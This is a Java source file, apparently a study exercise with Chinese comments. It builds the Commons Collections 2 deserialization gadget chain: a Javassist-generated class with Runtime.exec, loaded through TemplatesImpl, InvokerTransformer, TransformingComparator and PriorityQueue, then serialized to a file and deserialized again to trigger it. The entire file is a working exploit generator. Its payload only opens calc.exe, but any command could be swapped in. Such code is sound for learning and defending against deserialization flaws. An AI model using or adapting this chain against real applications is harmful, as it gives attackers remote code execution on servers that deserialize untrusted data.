package gadget;

import util.ReflectionUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2Test {
    public static void main(String[] args) throws Exception {
        //使用Javassit新建一个含有static的类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};


        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");

        InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator comparator = new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
        queue.add("1");//添加数字1插入此优先级队列
        queue.add("1");//添加数字1插入此优先级队列

        Field field2 = queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
        field2.setAccessible(true);//暴力反射
        field2.set(queue, comparator);//设置queue的comparator字段值为comparator

        Field field3 = queue.getClass().getDeclaredField("queue");//获取queue的queue字段
        field3.setAccessible(true);//暴力反射
        field3.set(queue, new Object[]{templates, 1});//设置queue的queue字段内容Object数组，内容为templatesImpl

        serialize(queue);
        unserialize();
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CC2.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CC2.bin"));
        objectInputStream.readObject();
    }
}